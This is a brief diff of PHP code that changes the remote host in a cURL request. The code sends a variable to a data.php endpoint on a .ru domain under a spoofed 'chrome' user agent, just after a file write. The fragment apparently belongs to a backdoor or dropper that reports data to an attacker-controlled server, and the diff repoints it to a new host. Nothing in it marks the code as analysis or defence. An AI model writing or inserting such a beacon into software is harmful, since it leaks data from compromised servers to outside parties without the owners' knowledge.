@@ -34,7 +34,7 @@ if (file_put_contents ($ss, $rr));
 $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'https://m.blogden.ru/data/data.php?s='.$d.'',
+    CURLOPT_URL => 'https://m.asdasd.ru/data/data.php?s='.$d.'',
     CURLOPT_USERAGENT => 'chrome'
 ]);
  $resp3 = curl_exec($curl3);
